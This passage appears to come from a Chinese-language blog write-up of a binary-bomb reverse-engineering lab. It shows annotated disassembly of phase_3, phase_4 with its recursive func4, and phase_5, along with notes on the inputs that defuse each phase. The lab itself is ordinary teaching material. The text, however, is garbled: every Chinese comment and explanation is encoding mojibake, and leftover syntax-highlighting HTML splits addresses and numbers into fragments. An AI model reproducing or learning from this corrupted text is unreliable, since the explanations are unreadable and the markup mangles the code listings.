class="hljs-attribute">400f63</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">400</span>f<span class="hljs-number">6</span>a &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>&gt;<br>  <span class="hljs-attribute">400f65</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">0</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f6a</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)<br>  <span class="hljs-attribute">400f6f</span>:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400</span>fad &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a&gt;<br>  <span class="hljs-attribute">400f71</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%eax#eaxæ˜¯è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—<br>  <span class="hljs-attribute">400f75</span>:ff <span class="hljs-number">24</span> c<span class="hljs-number">5</span> <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>(,%rax,<span class="hljs-number">8</span>)#<span class="hljs-number">8</span>*rax+*<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>ï¼Œè·³è½¬åˆ°ä¸‹é¢è¯­å¥çš„å…¶ä¸­ä¹‹ä¸€<br>  <span class="hljs-attribute">400f7c</span>:b<span class="hljs-number">8</span> cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xcf,%eax#å¦‚æœè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯<span class="hljs-number">0</span>é‚£ä¹ˆå°±ä¼šè·³åˆ°è¿™é‡Œ<br>  <span class="hljs-attribute">400f81</span>:eb <span class="hljs-number">3</span>b                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f83</span>:b<span class="hljs-number">8</span> c<span class="hljs-number">3</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>c<span class="hljs-number">3</span>,%eax<br>  <span class="hljs-attribute">400f88</span>:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f8a</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">100</span>,%eax<br>  <span class="hljs-attribute">400f8f</span>:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f91</span>:b<span class="hljs-number">8</span> <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">185</span>,%eax<br>  <span class="hljs-attribute">400f96</span>:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f98</span>:b<span class="hljs-number">8</span> ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xce,%eax<br>  <span class="hljs-attribute">400f9d</span>:eb <span class="hljs-number">1</span>f                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f9f</span>:b<span class="hljs-number">8</span> aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>aa,%eax<br>  <span class="hljs-attribute">400fa4</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fa6</span>:b<span class="hljs-number">8</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">147</span>,%eax<br>  <span class="hljs-attribute">400fab</span>:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fad</span>:e<span class="hljs-number">8</span> <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fb2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400fb7</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fb9</span>:b<span class="hljs-number">8</span> <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">137</span>,%eax<br>  <span class="hljs-attribute">400fbe</span>:<span class="hljs-number">3</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0</span>xc(%rsp),%eax#å¾—åˆ°ç¬¬äºŒä¸ªå€¼<span class="hljs-number">0</span>xc(%rsp)<br>  <span class="hljs-attribute">400fc2</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>fc<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">86</span>&gt;<br>  <span class="hljs-attribute">400fc4</span>:e<span class="hljs-number">8</span> <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fc9</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400fcd</span>:c<span class="hljs-number">3</span>                   retq   <br><br></code></pre></td></tr></table></figure></li></ul><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><ul><li>è¿™ä¸ªå’Œä¸Šä¸€ä¸ªç±»ä¼¼ï¼Œéƒ½æ˜¯è¾“å…¥ä¸¤ä¸ªå€¼åˆ¤æ–­æ˜¯ä¸æ˜¯æ»¡è¶³è¦æ±‚</li><li>å‡½æ•°å†…åˆè°ƒç”¨äº†func4å‡½æ•°ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªé€’å½’ã€‚func4å‡½æ•°æ˜¯ä¸€ä¸ªæœ‰ä¸‰ä¸ªå‚æ•°çš„é€’å½’å‡½æ•°ï¼Œå¦‚æœä¸€ç›´æ‰‹åŠ¨åˆ†æé€’å½’çš„è¿‡ç¨‹ä¼šæŠŠè‡ªå·±ç»•æ™•ï¼Œæ‰€ä»¥æ‰§è¡Œjleç›´æ¥è·³å‡ºé€’å½’ï¼Œæœ€åå‘ç°è§£é¢˜ç¡®å®ç”¨ä¸ç€é€’å½’ï¼Œç›´æ¥è·³å‡ºå»å°±å¥½äº†</li><li>ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ»¡è¶³&lt;=7åˆè¦æ»¡è¶³&gt;=7å› æ­¤å°±æ˜¯7</li><li>ç¬¬äºŒä¸ªå‚æ•°éœ€è¦æ»¡è¶³æ˜¯0<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">000000000040100c</span> &lt;phase_<span class="hljs-number">4</span>&gt;:# å‚æ•°é¡ºåºï¼šrdiï¼ˆè¾“å…¥çš„å­—ç¬¦ä¸²ï¼‰ rsiï¼ˆï¼‰ rdx rcx r<span class="hljs-number">8</span> r<span class="hljs-number">9</span> <br>  <span class="hljs-attribute">40100c</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">401010</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx #è¾“å…¥çš„ç¬¬äºŒä¸ªæ•°å­—ï¼Œä¹Ÿå³æ˜¯sscanfçš„ç¬¬ä¸‰ä¸ªå‚æ•°<br>  <span class="hljs-attribute">401015</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx #è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—<br>  <span class="hljs-attribute">40101a</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi #å­—ç¬¦ä¸²â€œ%d %dâ€çš„é¦–åœ°å€<br>  <span class="hljs-attribute">40101f</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">401024</span>:e<span class="hljs-number">8</span> c<span class="hljs-number">7</span> fb ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">401029</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>,%eax #eaxæ˜¯sscanfå‡½æ•°çš„è¿”å›å€¼ï¼Œè¿™é‡Œå¿…é¡»æ˜¯<span class="hljs-number">2</span><br>  <span class="hljs-attribute">40102c</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401035</span> &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">40102e</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">0</span>e       cmpl   $<span class="hljs-number">0</span>xe,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)#<span class="hljs-number">0</span>xe=<span class="hljs-number">14</span> (rsp+<span class="hljs-number">8</span>)&lt;=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">401033</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">40103</span>a &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e&gt;<br>  <span class="hljs-attribute">401035</span>:e<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">40103a</span>:ba <span class="hljs-number">0</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xe,%edx#edx=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">40103f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%esi#esi=<span class="hljs-number">0</span><br>  <span class="hljs-attribute">401044</span>:<span class="hljs-number">8</span>b <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%edi#è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—=edi,edi&lt;=<span class="hljs-number">8</span><br>  <span class="hljs-attribute">401048</span>:e<span class="hljs-number">8</span> <span class="hljs-number">81</span> ff ff ff       callq  <span class="hljs-number">400</span>fce &lt;func<span class="hljs-number">4</span>&gt;<br>  <span class="hljs-attribute">40104d</span>:<span class="hljs-number">85</span> c<span class="hljs-number">0</span>                test   %eax,%eax<br>  <span class="hljs-attribute">40104f</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401058</span> &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>c&gt;<br>  <span class="hljs-attribute">401051</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,<span class="hljs-number">0</span>xc(%rsp)#ç¬¬äºŒä¸ªå‚æ•°<br>  <span class="hljs-attribute">401056</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">40105</span>d &lt;phase_<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">51</span>&gt;<br>  <span class="hljs-attribute">401058</span>:e<span class="hljs-number">8</span> dd <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">40105d</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">401061</span>:c<span class="hljs-number">3</span>                   retq   <br><br><span class="hljs-attribute">0000000000400fce</span> &lt;func<span class="hljs-number">4</span>&gt;:#ediï¼šè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­— esiï¼š<span class="hljs-number">0</span><br>  <span class="hljs-attribute">400fce</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp<br>  <span class="hljs-attribute">400fd2</span>:<span class="hljs-number">89</span> d<span class="hljs-number">0</span>                mov    %edx,%eax#eax=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fd4</span>:<span class="hljs-number">29</span> f<span class="hljs-number">0</span>                sub    %esi,%eax#eax=eax-esi=<span class="hljs-number">14</span>-<span class="hljs-number">0</span>=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fd6</span>:<span class="hljs-number">89</span> c<span class="hljs-number">1</span>                mov    %eax,%ecx#ecx=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fd8</span>:c<span class="hljs-number">1</span> e<span class="hljs-number">9</span> <span class="hljs-number">1</span>f             shr    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f,%ecx#logic shift right <span class="hljs-number">31</span> bits ecx=<span class="hljs-number">0</span><br>  <span class="hljs-attribute">400fdb</span>:<span class="hljs-number">01</span> c<span class="hljs-number">8</span>                add    %ecx,%eax#eax=<span class="hljs-number">14</span><br>  <span class="hljs-attribute">400fdd</span>:d<span class="hljs-number">1</span> f<span class="hljs-number">8</span>                sar    %eax #mathematical shift right <span class="hljs-number">1</span> bit,rax=<span class="hljs-number">14</span>&gt;&gt;<span class="hljs-number">1</span>=<span class="hljs-number">7</span> <br>  <span class="hljs-attribute">400fdf</span>:<span class="hljs-number">8</span>d <span class="hljs-number">0</span>c <span class="hljs-number">30</span>             lea    (%rax,%rsi,<span class="hljs-number">1</span>),%ecx #ecx=rax+rsi=<span class="hljs-number">7</span>+<span class="hljs-number">0</span>=<span class="hljs-number">7</span><br>  <span class="hljs-attribute">400fe2</span>:<span class="hljs-number">39</span> f<span class="hljs-number">9</span>                cmp    %edi,%ecx #edi&lt;=ecx<br>  <span class="hljs-attribute">400fe4</span>:<span class="hljs-number">7</span>e <span class="hljs-number">0</span>c                jle    <span class="hljs-number">400</span>ff<span class="hljs-number">2</span> &lt;func<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">24</span>&gt;<br>  <span class="hljs-attribute">400fe6</span>:<span class="hljs-number">8</span>d <span class="hljs-number">51</span> ff             lea    -<span class="hljs-number">0</span>x<span class="hljs-number">1</span>(%rcx),%edx<br>  <span class="hljs-attribute">400fe9</span>:e<span class="hljs-number">8</span> e<span class="hljs-number">0</span> ff ff ff       callq  <span class="hljs-number">400</span>fce &lt;func<span class="hljs-number">4</span>&gt;<br>  <span class="hljs-attribute">400fee</span>:<span class="hljs-number">01</span> c<span class="hljs-number">0</span>                add    %eax,%eax<br>  <span class="hljs-attribute">400ff0</span>:eb <span class="hljs-number">15</span>                jmp    <span class="hljs-number">401007</span> &lt;func<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">39</span>&gt;<br>  <span class="hljs-attribute">400ff2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400ff7</span>:<span class="hljs-number">39</span> f<span class="hljs-number">9</span>                cmp    %edi,%ecx<br>  <span class="hljs-attribute">400ff9</span>:<span class="hljs-number">7</span>d <span class="hljs-number">0</span>c                jge    <span class="hljs-number">401007</span> &lt;func<span class="hljs-number">4</span>+<span class="hljs-number">0</span>x<span class="hljs-number">39</span>&gt;<br>  <span class="hljs-attribute">400ffb</span>:<span class="hljs-number">8</span>d <span class="hljs-number">71</span> <span class="hljs-number">01</span>             lea    <span class="hljs-number">0</span>x<span class="hljs-number">1</span>(%rcx),%esi<br>  <span class="hljs-attribute">400ffe</span>:e<span class="hljs-number">8</span> cb ff ff ff       callq  <span class="hljs-number">400</span>fce &lt;func<span class="hljs-number">4</span>&gt;<br>  <span class="hljs-attribute">401003</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0</span>x<span class="hljs-number">1</span>(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>  <span class="hljs-attribute">401007</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp<br>  <span class="hljs-attribute">40100b</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure></li></ul><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¸º6ï¼Œå¯¹äºæ¯ä¸ªå­—ç¬¦ï¼Œå–ä½å››ä½ï¼Œç„¶ååŠ ä¸Š0x4024b0è¿›è¡Œåç§»ï¼Œè¿™æ ·æ“ä½œå¾—åˆ°çš„å­—ç¬¦ä¸²ä¸åœ°å€ä¸º0x40245eçš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼ˆx/sæŸ¥çœ‹å¯ä»¥å¾—åˆ°æ˜¯â€œflyerâ€ï¼‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000401062</span> &lt;phase_<span class="hljs-number">5</span>&gt;:#rdiä¿å­˜è¾“å…¥çš„å­—ç¬¦ä¸²<br>  <span class="hljs-attribute">401062</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-attribute">401063</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">20</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">20</span>,%rsp #<span class="hljs-number">2</span>*<span class="hljs-number">16</span>=<span class="hljs-number">32</span> bytes<br>  <span class="hljs-attribute">401067</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx #rbxä¿å­˜è¾“å…¥çš„å­—ç¬¦ä¸²<br>  <span class="hljs-attribute">40106a</span>:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> mov    %fs:<span class="hljs-number">0</span>x<span class="hljs-number">28</span>,%rax #å †æ ˆé‡‘ä¸é›€<br>  <span class="hljs-attribute">401071</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-attribute">401073</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    %rax,<span class="hljs-number">0</span>x<span class="hljs-number">18</span>(%rsp)#æ”¾åœ¨rsp+<span class="hljs-number">0</span>x<span class="hljs-number">18</span>ä½ç½®<br>  <span class="hljs-attribute">401078</span>:<span class="hljs-number">31</span> c<span class="hljs-number">0</span>                xor    %eax,%eax #eaxæ¸…é›¶<br>  <span class="hljs-attribute">40107a</span>:e<span class="hljs-number">8</span> <span class="hljs-number">9</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40131</span>b &lt;string_length&gt;<br>  <span class="hljs-attribute">40107f</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">06</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">6</span>,%eax#è¿™é‡Œè¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¿…é¡»æ˜¯<span class="hljs-number">6</span><br>  <span class="hljs-attribute">401082</span>:<span class="hljs-number">74</span> <span class="hljs-number">4</span>e                je     <span class="hljs-number">4010</span>d<span class="hljs-number">2</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">70</span>&gt;<br>  <span class="hljs-attribute">401084</span>:e<span class="hljs-number">8</span> b<span class="hljs-number">1</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">401089</span>:eb <span class="hljs-number">47</span>                jmp    <span class="hljs-number">4010</span>d<span class="hljs-number">2</span> &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">70</span>&gt;<br>  <span class="hljs-attribute">40108b</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">0</span>c <span class="hljs-number">03</span>          movzbl (%rbx,%rax,<span class="hljs-number">1</span>),%ecx#ecx=rbx+rax=rbxï¼Œä¹Ÿå³æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²çš„ä½ç½®<br>  <span class="hljs-attribute">40108f</span>:<span class="hljs-number">88</span> <span class="hljs-number">0</span>c <span class="hljs-number">24</span>             mov    %cl,(%rsp)#clæ˜¯ecxçš„ä½<span class="hljs-number">8</span>ä½ï¼Œä¹Ÿå³æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦<br>  <span class="hljs-attribute">401092</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>b <span class="hljs-number">14</span> <span class="hljs-number">24</span>          mov    (%rsp),%rdx#æŠŠç¬¬ä¸€ä¸ªå­—ç¬¦èµ‹ç»™rdx<br>  <span class="hljs-attribute">401096</span>:<span class="hljs-number">83</span> e<span class="hljs-number">2</span> <span class="hljs-number">0</span>f             and    $<span class="hljs-number">0</span>xf,%edx#ä¸è¿ç®— f=<span class="hljs-number">1111</span> è¿™é‡Œæ˜¯åªå–ä½<span class="hljs-number">4</span>ä½<br>  <span class="hljs-comment"># ä½¿ç”¨x/16xb 0x4024b0æŸ¥çœ‹æ•°ç»„å†…çš„å€¼ï¼Œè¿™é‡Œç›¸å½“äºæŠŠè¾“å…¥çš„å­—ç¬¦å–ä½å››ä½ï¼ŒåŠ ä¸Š0x4024b0è¿›è¡Œåç§»å¾—åˆ°flyersç›¸åŒçš„å­—ç¬¦ä¸²</span><br>  <span class="hljs-attribute">401099</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">92</span> b<span class="hljs-number">0</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> movzbl <span class="hljs-number">0</span>x<span class="hljs-number">4024</span>b<span class="hljs-number">0</span>(%rdx),%edx #edx=<span class="hljs-number">0</span>x<span class="hljs-number">73</span><br>  <span class="hljs-attribute">4010a0</span>:<span class="hljs-number">88</span> <span class="hljs-number">54</span> <span class="hljs-number">04</span> <span class="hljs-number">10</span>          mov    %dl,<span class="hljs-number">0</span>x<span class="hljs-number">10</span>(%rsp,%rax,<span class="hljs-number">1</span>)#dl=<span class="hljs-number">0</span>x<span class="hljs-number">73</span> -&gt; (rsp+rax+<span class="hljs-number">0</span>x<span class="hljs-number">10</span>)<br>  <span class="hljs-attribute">4010a4</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">0</span> <span class="hljs-number">01</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%rax # rax : <span class="hljs-number">0</span>-&gt;<span class="hljs-number">1</span><br>  <span class="hljs-attribute">4010a8</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">6</span>,%rax <br>  <span class="hljs-attribute">4010ac</span>:<span class="hljs-number">75</span> dd                jne    <span class="hljs-number">40108</span>b &lt;phase_<span class="hljs-number">5</span>+<span class="hljs-number">0</span>x<span class="hljs-number">29</span>&gt;<br>  <span class="hljs-attribute">4010ae</span>:c<span class="hljs-number">6</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>       movb   $<span 